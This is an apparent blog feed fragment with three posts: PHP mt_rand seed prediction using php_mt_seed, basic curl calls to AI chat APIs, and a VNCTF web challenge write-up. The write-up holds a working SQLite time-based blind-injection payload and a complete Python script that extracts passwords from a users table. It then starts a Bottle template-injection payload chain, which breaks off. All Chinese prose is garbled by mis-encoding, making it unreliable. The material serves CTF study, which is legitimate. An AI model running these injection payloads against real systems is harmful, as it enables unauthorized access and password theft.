    <content type="html"><![CDATA[<h1 id="mt-rand-å­˜åœ¨çš„é—®é¢˜"><a href="#mt-rand-å­˜åœ¨çš„é—®é¢˜" class="headerlink" title="mt_rand()å­˜åœ¨çš„é—®é¢˜"></a><strong>mt_rand()å­˜åœ¨çš„é—®é¢˜</strong></h1><p>mt_rand()å¦‚ä½•ç”Ÿæˆçš„éšæœºæ•´æ•°ï¼Œå®ƒä¸è®¾ç½®çš„seedå€¼å’Œè°ƒç”¨è¯¥å‡½æ•°çš„æ¬¡æ•°æœ‰å…³ï¼Œå‡è®¾ä½¿ç”¨mt_srand(12345)è¿›è¡Œäº†ä¸€æ¬¡æ’­ç§ï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡è°ƒç”¨mt_randç”Ÿæˆçš„æ•°å€¼ä¸ºaï¼Œç¬¬äºŒæ¬¡ä¸ºbï¼Œç¬¬ä¸‰æ¬¡ä¸ºcã€‚æ‰€ä»¥å½“æœ‰äººæ‹¿åˆ°ä¸ä½ ä¸€ä¸²ä¸€æ¨¡ä¸€æ ·çš„seedæ—¶ï¼Œæ‰€æ‰§è¡Œçš„ç»“æœéƒ½æ˜¯è·Ÿåˆšåˆšæè¿°çš„ä¸€æ ·ï¼Œè¿™æ ·å°±å¯ä»¥é¢„æµ‹å‡ºæ¥ä¸‹æ¥çš„æ•°å€¼æ˜¯å¤šå°‘<br>éªŒè¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å½“randå€¼ä¸º123æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—ï¼š\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">5</span> ;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">11111111</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å½“randå€¼ä¸º11111111æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—:\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span> ;<span class="hljs-variable">$k</span> &lt; <span class="hljs-number">5</span>; <span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å½“randå€¼ä¸º123æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—:\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span> ;<span class="hljs-variable">$k</span> &lt; <span class="hljs-number">5</span>; <span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å½“randå€¼ä¸º123æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—ï¼š\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">5</span> ;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dns">å½“randå€¼ä¸º<span class="hljs-number">123</span>æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—ï¼š<br><span class="hljs-number">1495656191</span><br><span class="hljs-number">1531059894</span><br><span class="hljs-number">614479551</span><br><span class="hljs-number">920134305</span><br><span class="hljs-number">487159790</span><br>å½“randå€¼ä¸º<span class="hljs-number">11111111</span>æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—:<br><span class="hljs-number">1275140870</span><br><span class="hljs-number">304669862</span><br><span class="hljs-number">188245067</span><br><span class="hljs-number">1742075826</span><br><span class="hljs-number">1668666189</span><br>å½“randå€¼ä¸º<span class="hljs-number">123</span>æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—:<br><span class="hljs-number">1495656191</span><br><span class="hljs-number">1531059894</span><br><span class="hljs-number">614479551</span><br><span class="hljs-number">920134305</span><br><span class="hljs-number">487159790</span><br>å½“randå€¼ä¸º<span class="hljs-number">123</span>æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—ï¼š<br><span class="hljs-number">1495656191</span><br><span class="hljs-number">1531059894</span><br><span class="hljs-number">614479551</span><br><span class="hljs-number">920134305</span><br><span class="hljs-number">487159790</span><br></code></pre></td></tr></table></figure><p>å‘ç°å¯¹äºä¸€ä¸ªç§å­ï¼Œé¢˜ç›®éšæœºæ•°ç”Ÿæˆçš„æ˜¯ä¸€æ ·çš„</p><h1 id="php-mt-seed4-0å·¥å…·"><a href="#php-mt-seed4-0å·¥å…·" class="headerlink" title="php_mt_seed4.0å·¥å…·"></a>php_mt_seed4.0å·¥å…·</h1><p>å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/openwall/php_mt_seed<br><span class="hljs-built_in">cd</span> php_mt_seed<br>make<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ–¹æ³•ï¼š</p><blockquote><p>time å¼€å¤´ï¼Œä½¿ç”¨ .&#x2F; æ‰§è¡Œæˆ‘ä»¬çš„ç¨‹åºï¼Œåé¢å†æ¥ä¸Šå¸Œæœ›é€†æ¨çš„éšæœºæ•°å­—èŠ‚</p></blockquote><p>éšæœºæ•°è½¬å­—èŠ‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">php_mt_seed</span>(<span class="hljs-params"><span class="hljs-variable">$dict</span></span>) </span>&#123;<br>    <span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$response</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$dict</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>); <span class="hljs-variable">$j</span>++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$dict</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$chars</span>[<span class="hljs-variable">$j</span>]) &#123;<br>                <span class="hljs-variable">$response</span> .= <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; 0 &#x27;</span> . (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>) - <span class="hljs-number">1</span>) . <span class="hljs-string">&#x27; &#x27;</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">php_mt_seed</span>(<span class="hljs-string">&quot;è¾“å…¥&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="ç‰¹æ®Šæƒ…å†µ"><a href="#ç‰¹æ®Šæƒ…å†µ" class="headerlink" title="ç‰¹æ®Šæƒ…å†µ"></a>ç‰¹æ®Šæƒ…å†µ</h1><p>è€Œä¸”æ•°æ®å¯ä»¥æŒ‰æ¬¡æ•°æ¨çš„ï¼Œå¦‚æœè¿è¡Œäº†ä¸¤æ¬¡éšæœºæ•°</p><p>å‡è®¾ç”Ÿæˆäº†12ä½çš„éšæœºå­—ç¬¦ä¸²ï¼Œç”Ÿæˆäº†ä¸¤æ¬¡ï¼Œæˆ‘ä»¬ä¸çŸ¥é“ç¬¬ä¸€æ¬¡çš„ï¼Œä½†æ˜¯çŸ¥é“ç¬¬äºŒæ¬¡çš„</p><p>æˆ‘ä»¬å¯ä»¥å†ç¬¬äºŒæ¬¡å¤„ç†åçš„å­—èŠ‚å‰åŠ ä¸Š12ç»„<code>0 0 0 0</code></p><p>ä¹Ÿå¯ä»¥å°†ç§å­çˆ†ç ´å‡ºæ¥</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phpä¼ªéšæœºæ•°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>API</title>
    <link href="/tuyi/2025/02/15/API%E4%B8%8Edeepseek/"/>
    <url>/tuyi/2025/02/15/API%E4%B8%8Edeepseek/</url>
    
    <content type="html"><![CDATA[<h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><h2 id="ä»€ä¹ˆæ˜¯API"><a href="#ä»€ä¹ˆæ˜¯API" class="headerlink" title="ä»€ä¹ˆæ˜¯API"></a>ä»€ä¹ˆæ˜¯API</h2><p>AIçš„APIåŸºæœ¬éƒ½éµå¾ªopenaiçš„æœ€æ—©å‘å¸ƒçš„APIæ ¼å¼(ä»¥deepseekä¸ºä¾‹)ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://api.deepseek.com/chat/completions \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -H <span class="hljs-string">&quot;Authorization: Bearer &lt;DeepSeek API Key&gt;&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        &quot;model&quot;: &quot;deepseek-chat&quot;,</span><br><span class="hljs-string">        &quot;messages&quot;: [</span><br><span class="hljs-string">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>è§£é‡Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://api.deepseek.com/chat/completions <br></code></pre></td></tr></table></figure><blockquote><p>è¯·æ±‚å¤´éƒ¨ï¼šä½ è¦è¯·æ±‚çš„æœåŠ¡æä¾›å•†</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¯·æ±‚æ ¼å¼ï¼šè®¾ç½®ä¸ºjsonæ ¼å¼   ps:APIéƒ½æ˜¯POSTä¼ å‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-H <span class="hljs-string">&quot;Authorization: Bearer &lt;DeepSeek API Key&gt;&quot;</span> <br></code></pre></td></tr></table></figure><blockquote><p>ä½ çš„APIå¯†é’¥</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">-d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        &quot;model&quot;: &quot;deepseek-chat&quot;,</span><br><span class="hljs-string">        &quot;messages&quot;: [</span><br><span class="hljs-string">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>å‘é€çš„æ•°æ®ï¼š</p><p>modelï¼šæ¨¡å‹åç§°ï¼›ä»¥å®˜æ–¹ä¸ºå‡†</p><p>messagesï¼šæ¶ˆæ¯ä¸»ä½“,ä»¥å­—å…¸æ•°ç»„æ ¼å¼ã€‚roleï¼šç”¨æˆ·    contentï¼šæ¶ˆæ¯</p></blockquote><p>ä½†æ˜¯æˆ‘çš„deekseekæ²¡é’±äº†ï¼Œç”¨NAIDIAåšæ¼”ç¤ºä¸€æ ·çš„</p><p>å‘é€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://integrate.api.nvidia.com/v1/chat/completions \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -H <span class="hljs-string">&quot;Authorization: Bearer API-key&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        &quot;model&quot;: &quot;deepseek-ai/deepseek-r1&quot;,</span><br><span class="hljs-string">        &quot;messages&quot;: [</span><br><span class="hljs-string">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>å›æ˜¾</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ae53374d84f74e1baf5e47f70108fd24&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;object&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;chat.completion&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;created&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1739601068</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;model&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;deepseek-ai/deepseek-r1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;choices&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;index&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;role&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;assistant&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&lt;think&gt;\n\n&lt;/think&gt;\n\nHello! How can I assist you today? ğŸ˜Š&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;tool_calls&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;logprobs&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;finish_reason&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;stop&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;matched_stop&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;usage&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt_tokens&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;total_tokens&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">21</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion_tokens&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">16</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;prompt_tokens_details&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><code>&#123;&quot;role&quot;:&quot;assistant&quot;,&quot;content&quot;:&quot;&lt;think&gt;\n\n&lt;/think&gt;\n\nHello! How can I assist you today? ğŸ˜Š&quot;,&quot;tool_calls&quot;:null&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>API</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF-web</title>
    <link href="/tuyi/2025/02/11/VNCTF-web/"/>
    <url>/tuyi/2025/02/11/VNCTF-web/</url>
    
    <content type="html"><![CDATA[<h1 id="å¥¶é¾™å›å®¶"><a href="#å¥¶é¾™å›å®¶" class="headerlink" title="å¥¶é¾™å›å®¶"></a>å¥¶é¾™å›å®¶</h1><p> è¾“å…¥<code>1&#39;</code>å›æ˜¾</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214130506725.png" alt="image-20250214130506725"></p><p>ä½†æ˜¯è¾“å…¥<code>1&#39;&#39;</code>ä¸¤ä¸ªå•å¼•å·</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214130543617.png" alt="image-20250214130543617"></p><p>æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜å­˜åœ¨sqlæ³¨å…¥</p><p>å…ˆfuzzä¸€ä¸‹</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214131102161.png" alt="image-20250214131102161"></p><p>è¿‡æ»¤äº†ä¸€ç‚¹è€Œä¸”å¯¹å¤§å°å†™æ•æ„Ÿï¼ŒçŒœæµ‹æ˜¯<code>sqlite</code>(ä¹Ÿå¯èƒ½æ˜¯æ­£åˆ™ï¼‰ï¼Œæ‰“æ—¶é—´ç›²æ³¨ï¼Œé‚£ä»–è¿‡æ»¤sleepå¹²å˜›ï¼Œè¿·æƒ‘æˆ‘ä»¬å—</p><p>æ—¢ç„¶çŒœæµ‹æ˜¯<code>sqlite</code>é‚£å°±ä½¿ç”¨<code>randombolb</code>å‡½æ•°è¯•è¯•</p><p>ç©ºæ ¼ä½¿ç”¨<code>/**/</code>è¿‡æ»¤</p><p>å°è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">payload = &quot;&#x27;OR/**/(case/**/when(substr(sqlite_version(),1,1)&lt;&#x27;310&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end);--&quot;<br></code></pre></td></tr></table></figure><p>å¤§ä½¬çš„è„šæœ¬(äºŒåˆ†æ³•)                                                                          </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://node.vnteam.cn:47163/login&#x27;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># payload = &#x27;sqlite_version()&#x27;</span><br>        <span class="hljs-comment"># payload = &#x27;select/**/group_concat(sql)/**/from/**/sqlite_master&#x27;</span><br>        <span class="hljs-comment"># payload = &#x27;select/**/group_concat(sql)/**/FROM/**/sqlite_master/**/WHERE/**/type=\&#x27;table\&#x27;/**/AND/**/name=\&#x27;users\&#x27;;&#x27;</span><br>        <span class="hljs-comment"># payload = &#x27;select/**/group_concat(username)/**/from/**/users&#x27;</span><br>        payload = <span class="hljs-string">&#x27;select/**/group_concat(password)/**/from/**/users&#x27;</span><br>        username = <span class="hljs-string">&#x27;baozongwi&#x27;</span><br>        char = <span class="hljs-built_in">chr</span>(mid)<br>        password = <span class="hljs-string">&quot;&#x27;or/**/(case/**/when(substr((&#123;&#125;),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)--&quot;</span>.<span class="hljs-built_in">format</span>(<br>            payload, i, char)<br>        json = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>: username,<br>            <span class="hljs-string">&quot;password&quot;</span>: password<br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            res = requests.post(url=url, json=json, timeout=<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">except</span> Exception:<br>            head = mid + <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\r[*]trying: <span class="hljs-subst">&#123;result&#125;</span>[<span class="hljs-subst">&#123;head&#125;</span>-<span class="hljs-subst">&#123;tail&#125;</span>]&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            tail = mid<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\r[*]trying: <span class="hljs-subst">&#123;result&#125;</span>[<span class="hljs-subst">&#123;head&#125;</span>-<span class="hljs-subst">&#123;tail&#125;</span>]&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>    result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\r[*]result: <span class="hljs-subst">&#123;result&#125;</span>&#x27;</span>)<br><br><br><br></code></pre></td></tr></table></figure><h1 id="å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ"><a href="#å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ" class="headerlink" title="å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ"></a><strong>å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ</strong></h1><p>å†™äº†ä¸€ä¸‹è¿™ä¸ªé¢˜ç›®ï¼Œèµ·åˆä»¥ä¸ºåªæ˜¯ç®€å•çš„sstiï¼Œä½†æ˜¯å‘ä¸‹æ˜¯bottleæ¨¡æ¿ï¼Œè€Œä¸”è¿˜é™åˆ¶äº†é•¿åº¦</p><p>é¢˜ç›®æç¤ºè¦å¤šè¡Œï¼Œåˆšå¼€å§‹æƒ³çš„æ˜¯<code>&#123;%set%&#125;</code>,ä¸çŸ¥é“æ˜¯botlleæ¨¡æ¿ï¼Œä¸çŸ¥é“æ²¡æœ‰è¿™ä¸ª</p><p><a href="https://www.osgeo.cn/bottle/stpl.html">bottleå¼€å‘æ–‡æ¡£</a></p><p>æœ‰ä¸€ä¸ªæ–°çš„çŸ¥è¯† <code>:=</code>ç‚¹å†python3.8ä»¥åå°±æœ‰äº†è¿™ä¸ªè¿ç®—ç¬¦</p><p> Bottle çš„æ¨¡æ¿å¼•æ“ä¾èµ–äº Python çš„è¡¨è¾¾å¼æ±‚å€¼ï¼Œä½†å®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„ Python è§£é‡Šå™¨ã€‚åœ¨æ¨¡æ¿ä¸­ï¼Œåªæœ‰å¯ç›´æ¥æ±‚å€¼çš„è¡¨è¾¾å¼æ‰èƒ½é€šè¿‡ <code>&#123;&#123;...&#125;&#125;</code> è¯­æ³•åµŒå…¥ã€‚å› æ­¤ï¼Œ<code>a=5</code> è¿™æ ·çš„èµ‹å€¼è¯­æ³•ä¼šå¯¼è‡´è¯­æ³•é”™è¯¯ï¼Œå› ä¸ºèµ‹å€¼æœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ªè¿”å›å€¼çš„è¡¨è¾¾å¼ï¼Œè€Œæ˜¯ä¸€ä¸ªæ“ä½œ</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a:</span>=<span class="hljs-number">5</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215171504250.png" alt="image-20250215171504250"></p><p>é‚£ä¹ˆå°±å¯ä»¥å†™äº†</p><p>payloadï¼š</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a:</span>=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">b:</span>=a.__class__&#125;&#125;</span><span class="language-xml"></span><br><span 